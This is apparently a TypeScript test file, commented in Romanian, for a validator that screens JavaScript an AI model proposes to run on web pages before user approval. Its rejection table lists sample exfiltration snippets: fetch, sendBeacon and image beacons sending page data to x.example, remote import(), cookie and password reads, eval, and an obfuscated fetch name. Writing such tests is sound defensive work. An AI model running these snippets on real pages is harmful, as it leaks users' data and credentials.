import { RUN_JS_LIMITS } from "@uishapeshifter/contracts";
import { describe, expect, it } from "vitest";
import { truncateRunJsText, validateRunJs } from "./run-js";

const PURPOSE = "Citește cu voce titlul articolului.";

describe("validateRunJs: plasa dinaintea aprobării (specs/05, modul expert)", () => {
  it("un cod care lucrează doar cu pagina trece, cu purpose curățat", () => {
    const code = `speechSynthesis.speak(new SpeechSynthesisUtterance(document.querySelector("h1").textContent));`;
    expect(validateRunJs({ code, purpose: `  ${PURPOSE} ` })).toEqual({ ok: true, code, purpose: PURPOSE });
  });

  it.each([
    ["fetch", `fetch("https://x.example/?d=" + document.title)`],
    ["XMLHttpRequest", `const r = new XMLHttpRequest(); r.open("GET", "/x");`],
    ["document.cookie", `alert(document.cookie)`],
    ["localStorage", `localStorage.setItem("a", "b")`],
    ["sendBeacon", `navigator.sendBeacon("https://x.example", "d")`],
    ["WebSocket", `new WebSocket("wss://x.example")`],
    ["sessionStorage", `sessionStorage.getItem("t")`],
    ["indexedDB", `indexedDB.open("db")`],
    ["new Image", `new Image().src = "https://x.example/?" + document.title`],
    ["eval", `eval("1 + 1")`],
    ["Function", `Function("return 1")()`],
    ["import()", `import("https://x.example/m.js")`],
    ["setTimeout cu text", `setTimeout("alert(1)", 10)`],
    ["nume ascunse", `window["\\u0066etch"]("https://x.example")`],
    ["parole", `document.querySelector('input[type="password"]').value`],
    ["formulare", `document.forms[0].submit()`],
  ])("%s e refuzat din start, cu motivul pentru model", (_name, code) => {
    const result = validateRunJs({ code, purpose: PURPOSE });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.message).toMatch(/Modul expert nu citește și nu trimite/);
  });

  it("fără code, fără purpose sau cu cod prea lung: refuzat", () => {
    expect(validateRunJs({ purpose: PURPOSE }).ok).toBe(false);
    expect(validateRunJs({ code: "1", purpose: " " }).ok).toBe(false);
    expect(validateRunJs({ code: "x".repeat(RUN_JS_LIMITS.maxCodeChars + 1), purpose: PURPOSE }).ok).toBe(false);
    expect(validateRunJs(null).ok).toBe(false);
  });

  it("prefetchList trece; .cookie-banner e refuzat (mai bine prea strict: bannerul se scoate cu apply_ops)", () => {
    expect(validateRunJs({ code: `const prefetchList = [1, 2].map((n) => n * 2);`, purpose: PURPOSE }).ok).toBe(true);
    expect(validateRunJs({ code: `document.querySelector(".cookie-banner")?.remove();`, purpose: PURPOSE }).ok).toBe(
      false,
    );
  });

  it("rezultatul lung se taie la limita din contract", () => {
    const text = truncateRunJsText("a".repeat(RUN_JS_LIMITS.maxResultChars + 50));
    expect(text).toHaveLength(RUN_JS_LIMITS.maxResultChars);
    expect(truncateRunJsText("scurt")).toBe("scurt");
  });
});
